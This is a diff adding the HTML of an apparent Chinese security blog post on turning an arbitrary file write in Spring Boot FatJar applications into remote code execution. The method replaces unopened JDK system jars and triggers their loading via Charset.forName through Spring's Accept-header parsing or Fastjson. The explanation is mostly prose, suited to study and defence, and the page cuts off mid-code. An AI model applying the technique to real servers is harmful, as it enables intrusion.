@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前言很早之前就看到过LandGrey师傅写的文章Spring Boot FatJar写文件漏洞到稳定RCE的探索，凑巧在暑期实习面试的时候面试官也问到了相关问题，如何对一个存在Fastjson任意文件写漏洞的SpringBoot项目来实现RCE？常规的一些方式可能是通过写计划任务、替换so&#x2F;dll等系统文件进行劫持等来实现RCE，但是实际情况下往往受限于权限、网络等问题，因此从Java代">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SpringBoot任意文件写场景下的RCE">
+<meta property="og:url" content="https://h3rmesk1t.github.io/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/index.html">
+<meta property="og:site_name" content="H3rmesk1t">
+<meta property="og:description" content="前言很早之前就看到过LandGrey师傅写的文章Spring Boot FatJar写文件漏洞到稳定RCE的探索，凑巧在暑期实习面试的时候面试官也问到了相关问题，如何对一个存在Fastjson任意文件写漏洞的SpringBoot项目来实现RCE？常规的一些方式可能是通过写计划任务、替换so&#x2F;dll等系统文件进行劫持等来实现RCE，但是实际情况下往往受限于权限、网络等问题，因此从Java代">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/1743571872121-887501c8-cfe5-4bec-9fc3-328c29c9f5db.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/1708347066695-144e68ff-e4cd-40c8-8e60-b62acc0e3a25.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/1743583367936-ee5eb7a9-e738-4691-ab96-9eaee3ca76b6.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/1743583700471-930fcdde-623c-4a55-9f77-9cbcb55af050.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/1743584000938-e11ba513-b58a-4510-b419-9382cf4d119d.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/1743583968645-83dee083-c9b8-48ff-9a98-d78d3bb680e4.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/1743585478461-cb459358-8ff1-4fb4-a72c-55786b7a8dcd.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/1743585621559-0f4ccf49-3f8c-491d-93e7-e89959fc776f.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/1743585845250-aae272b6-5f58-4dd1-aa4a-99d6ed99afab.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/1743587583962-fc3c0b50-38b8-4636-acd9-b4c70e8827f7.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/1743590578389-c9f7771a-a6aa-46fa-a18b-70dc48af5b6f.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/1743590844658-77e03ed4-c5ae-41ce-bd2e-76b1294e2b7b.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/1743590888449-f4cee28c-98ab-4dd6-8547-adb34b6f43e5.png">
+<meta property="article:published_time" content="2025-04-02T11:00:00.000Z">
+<meta property="article:modified_time" content="2025-04-02T11:01:40.081Z">
+<meta property="article:author" content="H3rmesk1t">
+<meta property="article:tag" content="Spring">
+<meta property="article:tag" content="Trick">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://h3rmesk1t.github.io/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/1743571872121-887501c8-cfe5-4bec-9fc3-328c29c9f5db.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/my-logo-mosaic.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/my-logo-mosaic-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/my-logo-mosaic.png">
+        
+      
+    
+    <!-- title -->
+    <title>SpringBoot任意文件写场景下的RCE</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="H3rmesk1t" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/06/09/UEBA%E5%9F%BA%E7%A1%80/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/12/31/2024%E6%80%BB%E7%BB%93/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://h3rmesk1t.github.io/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://h3rmesk1t.github.io/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/&text=SpringBoot任意文件写场景下的RCE"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://h3rmesk1t.github.io/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/&title=SpringBoot任意文件写场景下的RCE"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://h3rmesk1t.github.io/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/&is_video=false&description=SpringBoot任意文件写场景下的RCE"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SpringBoot任意文件写场景下的RCE&body=Check out this article: https://h3rmesk1t.github.io/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://h3rmesk1t.github.io/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/&title=SpringBoot任意文件写场景下的RCE"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://h3rmesk1t.github.io/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/&title=SpringBoot任意文件写场景下的RCE"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://h3rmesk1t.github.io/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/&title=SpringBoot任意文件写场景下的RCE"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://h3rmesk1t.github.io/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/&title=SpringBoot任意文件写场景下的RCE"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://h3rmesk1t.github.io/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/&name=SpringBoot任意文件写场景下的RCE&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://h3rmesk1t.github.io/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/&t=SpringBoot任意文件写场景下的RCE"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE"><span class="toc-number">2.</span> <span class="toc-text">前置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FatJar"><span class="toc-number">2.1.</span> <span class="toc-text">FatJar</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD"><span class="toc-number">2.2.</span> <span class="toc-text">类加载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%9A%84%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B"><span class="toc-number">2.3.</span> <span class="toc-text">类加载器的加载流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%88%B6"><span class="toc-number">2.4.</span> <span class="toc-text">双亲委派机制</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0"><span class="toc-number">4.</span> <span class="toc-text">实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Charset"><span class="toc-number">4.1.</span> <span class="toc-text">Charset</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Spring"><span class="toc-number">4.1.1.</span> <span class="toc-text">Spring</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Fastjson"><span class="toc-number">4.1.2.</span> <span class="toc-text">Fastjson</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Jackson"><span class="toc-number">4.1.3.</span> <span class="toc-text">Jackson</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JDBC"><span class="toc-number">4.1.4.</span> <span class="toc-text">JDBC</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jre-classes"><span class="toc-number">4.2.</span> <span class="toc-text">jre&#x2F;classes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SPI"><span class="toc-number">4.3.</span> <span class="toc-text">SPI</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A2%8E%E7%A2%8E%E5%BF%B5"><span class="toc-number">5.</span> <span class="toc-text">碎碎念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">6.</span> <span class="toc-text">参考</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        SpringBoot任意文件写场景下的RCE
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">H3rmesk1t</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-04-02T11:00:00.000Z" class="dt-published" itemprop="datePublished">2025-04-02</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Java/">Java</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Spring/" rel="tag">Spring</a>, <a class="p-category" href="/tags/Trick/" rel="tag">Trick</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>很早之前就看到过LandGrey师傅写的文章<a target="_blank" rel="noopener" href="https://landgrey.me/blog/22/">Spring Boot FatJar写文件漏洞到稳定RCE的探索</a>，凑巧在暑期实习面试的时候面试官也问到了相关问题，<strong>如何对一个存在Fastjson任意文件写漏洞的SpringBoot项目来实现RCE？</strong>常规的一些方式可能是通过写计划任务、替换so&#x2F;dll等系统文件进行劫持等来实现RCE，但是实际情况下往往受限于权限、网络等问题，因此从Java代码层面来寻找一种RCE的方式更为贴切。</p>
+<h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><h3 id="FatJar"><a href="#FatJar" class="headerlink" title="FatJar"></a>FatJar</h3><p>FatJar通常也称为uber-JAR，是一种Java归档文件，它不仅包括应用程序的编译源代码，还包括运行应用程序所需的所有依赖项和资源。这些依赖项可能包括库、框架，甚至是嵌入式服务器，如Tomcat或Jetty，这些通常在SpringBoot应用中使用。</p>
+<p>换句话说，FatJar是一个独立可直接运行的软件包。与普通JAR文件不同的是，普通JAR文件在运行应用程序时可能需要在classpath中存在外部依赖，而FatJAR文件则完全自给自足，可以在任何已安装Java虚拟机的系统上运行，无需安装或设置任何额外的依赖。</p>
+<h3 id="类加载"><a href="#类加载" class="headerlink" title="类加载"></a>类加载</h3><p>类从被加载到 JVM 开始，到卸载出内存，整个生命周期分为七个阶段，分别是加载、验证、准备、解析、初始化、使用和卸载。其中，验证、准备和解析这三个阶段统称为连接。系统加载Class类型的文件主要三步，加载-&gt;连接-&gt;初始化；连接过程又可分为三步，验证-&gt;准备-&gt;解析。</p>
+<p>类加载器是一个负责加载类的对象，主要作用就是动态加载Java类的字节码（.class文件）到JVM中（在内存中生成一个代表该类的Class对象）。其中，字节码可以是Java源程序（.java文件）经过javac编译得来，也可以是通过工具动态生成或者通过网络下载得来。</p>
+<p><strong>类装载 (Class loading) 和类初始化 (Class initialization) 通常并称为类加载。</strong></p>
+<p>类装载是由JVM的不同ClassLoader，包括Bootstrap Classloder、Extention ClassLoader、App ClassLoader和用户自定义的Classloder完成。类装载通常是一个Class在字节码中引用另一个Class时被动触发的，也有通过Classloder#loadClass和Class#forName等方式主动触发的。</p>
+<p>利用命令”java -XX:+TraceClassLoading xxx.jar”可以观察到类装载的过程如下，其中，Opened操作代表打开指定文件，通常表示第一次读取相关字节码到内存；Loaded操作代表将读取的指定类的字节码进行装载。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[Opened /Library/Java/JavaVirtualMachines/jdk1.8.0_65.jdk/Contents/Home/jre/lib/rt.jar]</span><br><span class="line">[Loaded java.lang.Object from /Library/Java/JavaVirtualMachines/jdk1.8.0_65.jdk/Contents/Home/jre/lib/rt.jar]</span><br><span class="line">[Loaded java.io.Serializable from /Library/Java/JavaVirtualMachines/jdk1.8.0_65.jdk/Contents/Home/jre/lib/rt.jar]</span><br><span class="line">[Loaded java.lang.Comparable from /Library/Java/JavaVirtualMachines/jdk1.8.0_65.jdk/Contents/Home/jre/lib/rt.jar]</span><br><span class="line">[Loaded java.lang.CharSequence from /Library/Java/JavaVirtualMachines/jdk1.8.0_65.jdk/Contents/Home/jre/lib/rt.jar]</span><br><span class="line">[Loaded java.lang.String from /Library/Java/JavaVirtualMachines/jdk1.8.0_65.jdk/Contents/Home/jre/lib/rt.jar]</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<p>类初始化阶段是类加载过程的最后一个阶段，它主要执行类的初始化代码，包括静态变量赋值和静态代码块的执行。以下是类初始化的具体过程：</p>
+<ol>
+<li>创建类的实例：通过new关键字、反射（Class.forName）、克隆（clone）或反序列化（ObjectInputStream.readObject）等方式创建类的实例时，会触发类初始化；</li>
+<li>调用类的静态方法：当调用类的静态方法时，会触发类初始化；</li>
+<li>访问类的静态字段：当访问类的静态字段时，会触发类初始化，但通过子类引用父类的静态字段，不会触发子类的初始化；</li>
+<li>反射调用：通过反射方式访问类时，如Class.forName，会触发类初始化；</li>
+<li>初始化子类：当初始化一个类时，如果其父类还没有初始化，会先触发父类的初始化；</li>
+<li>虚拟机启动时：虚拟机启动时，会初始化指定的主类。</li>
+</ol>
+<h3 id="类加载器的加载流程"><a href="#类加载器的加载流程" class="headerlink" title="类加载器的加载流程"></a>类加载器的加载流程</h3><ol>
+<li>首先，ClassLoader会调用loadClass方法加载类；</li>
+<li>loadClass方法先调用findLoadedClass方法检查类是否已经初始化，如果JVM已初始化过该类则直接返回类对象；</li>
+<li>如果创建当前ClassLoader时传入了父类加载器，就使用父类加载器加载类，否则使用Bootstrap ClassLoader进行加载；</li>
+<li>如果上一步无法加载类，那么调用自身的findClass方法尝试加载类；</li>
+<li>如果当前的ClassLoader没有重写了findClass方法，那么直接返回类加载失败异常；如果当前类重写了findClass方法并通过传入的类名找到了对应的类字节码，那么调用defineClass方法去JVM中注册该类；</li>
+<li>如果调用loadClass的时候传入的resolve参数为true，那么还需要调用resolveClass方法链接类，默认为false；</li>
+<li>最后，返回一个被JVM加载后的java.lang.Class类对象。</li>
+</ol>
+<p><img src="/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/1743571872121-887501c8-cfe5-4bec-9fc3-328c29c9f5db.png"></p>
+<h3 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h3><p>由于App ClassLoader只负责加载classpath下的类库，因此当App ClassLoader遇到没有加载的系统类库时，会将系统类库的加载工作交给Bootstrap ClassLoader和Extension ClassLoader，这就是双亲委派。</p>
+<p>在下图中，App ClassLoader在加载一个未知的类名时，并不是立即去搜寻classpath，它会首先将这个类名称交给Extension ClassLoader来加载，如果Extension ClassLoader可以加载，那么App ClassLoader就不会进行加载，否则的话App ClassLoader会搜索classpath。Extension ClassLoader在加载一个未知的类名时，也并不是立即搜寻ext路径，它会首先将类名称交给Bootstrap ClassLoader来加载，如果Bootstrap ClassLoader可以加载，Extension ClassLoader也不会对其进行加载，否则的话才会搜索ext路径下的jar包。</p>
+<p><img src="/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/1708347066695-144e68ff-e4cd-40c8-8e60-b62acc0e3a25.png"></p>
+<p>App ClassLoader、Extension ClassLoader、Bootstrap ClassLoader三者之间形成了一个级联的父子关系，优先把任务交给其父亲，当其父亲无法完成任务时才会轮到自己，在每个ClassLoader对象的内部都会存在一个parent属性指向自己的父加载器。</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>上文提到了，在类初始化阶段时会执行static代码块、static属性引用的方法等，还可能执行构造器中的代码。在类装载的过程中可以看到应用程序在首次启动时会装载很多类，同时，在应用程序运行过程中，会因为部分代码首次执行或首次异常报错而触发一些类的装载和初始化，</p>
+<p>如果能够找到一种方法，控制应用程序在指定的文件写漏洞可控的文件范围内，主动触发初始化恶意的类，那么就有可能将写文件漏洞转变为代码执行漏洞。</p>
+<p>对于SpringBoot来说，FatJar会把所有资源打包进一个Jar文件内，因此无法再应用程序运行时往classpath等目录内写入文件，这也导致无法通过写Webshell、替换模版资源文件以及替换class文件等方式来实现RCE。</p>
+<p>既然无法将文件写入应用程序的classpath目录中，那能否可以将文件写入更为底层的系统classpath目录（JDK HOME目录）中呢？</p>
+<p>在Java程序运行时，JVM会通过类加载器来完成类的加载，将类文件加载到内存中。<strong>但JVM存在”懒加载”特性，懒加载机制的一个主要特征是相关.jar文件的Opened操作不会在程序一开始运行时就发生。</strong>换句话说，JVM不会在程序启动时就打开所有.jar文件来加载其中的类，只有当程序代码中真正调用到某个类时（例如通过new关键字创建对象、调用类的静态方法或访问类的静态字段等操作），JVM才会去打开包含该类的.jar文件，并加载该类到内存中。例如，如果程序中有一个java.util.ArrayList类的实例化操作，那么JVM会在执行到这行代码时，才去打开包含ArrayList类的.jar文件（通常是rt.jar或java.base模块中的某个.jar文件），并加载ArrayList类。</p>
+<p>结合这个特性，可以通过增加或替换JDK HOME目录下的系统jar文件并主动触发jar文件里的类初始化操作来实现RCE的目的。需要注意的是，JDK在启动后，不会主动寻找JDK HOME目录下新增的jar文件去尝试加载，<strong>因此只能替换JDK HOME目录下原有的系统jar文件，并且还必须是系统启动后没有进行过Opened操作的系统jar文件。</strong></p>
+<p>除此以外，由于JDK HOME的目录路径一般是不固定的，可以通过枚举目录的方式来写入文件。</p>
+<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><h3 id="Charset"><a href="#Charset" class="headerlink" title="Charset"></a>Charset</h3><h4 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h4><p>在spring-web组件的org.springframework.web.accept.HeaderContentNegotiationStrategy类中，对于每一次请求，Spring框架都会尝试解析Accept头的值，并设置相应的字符集编码。</p>
+<p><img src="/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/1743583367936-ee5eb7a9-e738-4691-ab96-9eaee3ca76b6.png"></p>
+<p>先跟进org.springframework.http.MediaType#parseMediaTypes方法，并再跟进几次调用到</p>
+<p>spring-core组件org.springframework.util.MimeTypeUtils#parseMimeTypeInternal方法中，对获取到的Accept头进行解析，最终实例化一个MimeType对象。</p>
+<p><img src="/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/1743583700471-930fcdde-623c-4a55-9f77-9cbcb55af050.png"></p>
+<p>跟进对应有参构造函数，利用checkParameters方法对parameters进行解析，接着调用Charset#forName方法来主动加载字符集的代码。</p>
+<p><img src="/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/1743584000938-e11ba513-b58a-4510-b419-9382cf4d119d.png"></p>
+<p><img src="/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/1743583968645-83dee083-c9b8-48ff-9a98-d78d3bb680e4.png"></p>
+<p>最后，结合上文分析的Spring框架解析Accept请求头来实现RCE目的。</p>
+<p><img src="/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/1743585478461-cb459358-8ff1-4fb4-a72c-55786b7a8dcd.png"></p>
+<h4 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h4><p>在com.alibaba.fastjson.parser.ParserConfig类中有如下处理代码，而实际的findClass方法会枚举buckets中保存的IdentityHashMap&lt;Type, ObjectDeserializer&gt;类型键值对，java.nio.charset.Charset类名正好在白名单中，所以可以直接返回clazz。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">    clazz = deserializers.findClass(typeName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> 